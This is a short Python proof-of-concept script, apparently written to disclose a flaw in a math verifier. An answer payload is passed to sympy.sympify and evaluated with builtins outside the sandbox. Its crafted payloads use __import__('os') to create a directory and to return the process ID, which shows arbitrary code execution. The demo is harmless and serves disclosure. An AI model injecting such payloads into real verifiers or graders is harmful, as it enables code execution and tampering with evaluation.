# SECURITY: a count_structures claim with claimed_answer.kind == "count" is passed RAW to
# equiv.exact_integer -> sympy.sympify(str) -> Python eval with builtins, in the verifier's OWN process
# (not the sandbox, no _check_safe). Harmless demo: creates an empty directory in the scratchpad and
# returns the evaluating process's pid as the "count".
import os, sys; sys.path.insert(0, __import__("os").environ.get("MV_SRC", str(__import__("pathlib").Path(__file__).resolve().parents[3] / "src")))
from mathverify.verifier import verify

MARK = __import__("os").path.join(__import__("tempfile").gettempdir(), "mv_rce_marker_dir")
if __name__ == "__main__":
    if os.path.isdir(MARK):
        os.rmdir(MARK)
    pir = {"task": {"kind": "count_structures", "params": {"space": {"structure": "combination", "n": 5, "k": 2}, "predicate": ""}},
           "vars": [], "givens": [], "answer_shape": "count"}
    r = verify(pir, {"claimed_answer": {"kind": "count", "payload": "[__import__('os').mkdir('%s'), 10][1]" % MARK}, "steps": []})
    print("verdict:", r.verdict, r.confidence, "| marker directory created:", os.path.isdir(MARK))
    r2 = verify(pir, {"claimed_answer": {"kind": "count", "payload": "Integer(__import__('os').getpid())"}, "steps": []})
    ev = [l.evidence for l in r2.layers if l.layer == "certify.combinatorics"][0]
    print("claimed count evaluated to", ev.get("claimed"), "| this process pid:", os.getpid(), "-> same process:", ev.get("claimed") == os.getpid())
    if os.path.isdir(MARK):
        os.rmdir(MARK)
